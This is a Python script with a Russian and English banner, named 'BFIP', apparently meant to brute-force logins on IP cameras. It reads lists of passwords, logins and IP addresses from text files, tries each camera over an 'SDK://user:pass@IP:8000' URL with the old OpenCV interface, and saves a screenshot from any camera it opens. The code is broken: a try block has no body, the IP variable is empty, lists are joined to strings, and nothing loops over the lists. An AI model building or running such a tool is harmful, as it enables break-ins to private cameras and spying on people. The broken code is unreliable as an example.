import cv2
import cv
import os

print(
'''
──────────╔══╗─╔══╗╔══╗╔═══╗──────────
──────────║╔╗║─║╔═╝╚╗╔╝║╔═╗║──────────
──────────║╚╝╚╗║╚═╗─║║─║╚═╝║──────────
──────────║╔═╗║║╔═╝─║║─║╔══╝──────────
──────────║╚═╝║║║──╔╝╚╗║║─────────────
──────────╚═══╝╚╝──╚══╝╚╝─────────────
██████████████████████████████████████
█████████─█─███████─█████────█████████
█████████─█─██████──█████─██─█████████
█████████─█─███████─█████─██─█████████
█████████───███████─█████─██─█████████
██████████─████████─██─██────█████████
██████████████████████████████████████

Вас приветствует программа BFIP.
Если вы хотите добавить собственную базу паролей для брута запишите её в Passwords.txt,
или если вы хотите добавить ещё и базу логинов тогда запишите её в Logins.txt
Приятного пользования!

Welcome to the BFIP program.
If you want to add your own password database, write it in Passwords.txt,
or if you want to add also the login database then write it in Logins.txt
Enjoy your use!
'''
)

def Start_or_Close():
    sc = input("Start/Close : ")

    if str.lower(sc) == 'close' or str.lower(sc) == 'c' or str.lower(sc) == 'cl' or str.lower(sc) == 'clo' or str.lower(sc) == 'clos':
        exit()
    elif str.lower(sc) == 'start' or str.lower(sc) == 's' or str.lower(sc) == 'st' or str.lower(sc) == 'sta' or str.lower(sc) == 'star':
        return
    else:
        Start_or_Close()

Start_or_Close()

pas = open('Passwords.txt').read().splitlines()
log = open('Logins.txt').read().splitlines()
IP = open('Input.txt').read().splitlines()

LIP = len(IP)
Lpas = len(pas)
Llog = len(log)

cwd = os.getcwd()
username = log
password = pas
nameforscreen = IP


print( "Ip адресов : " + str(LIP) + "\n" + "Логинов : " + str(Llog) + "\n" + "Паролей : " + str(Lpas) + "\n" +'Начинаю брут...')
try:

UIP = ''
takeaphoto = cv.CaptureFromCAM('SDK://' + username + ':' + password + '@' + UIP + ':8000/1')


path = cwd + "\\screenshots" + "\\" + nameforscreen + ".jpg"
frame = cv.QueryFrame(takeaphoto)
cv.SaveImage(path, frame)





delimiter = '@'
except AttributeError:
    a = -1
    if IP == "error":
        a += 1


else:
    succesful = ''
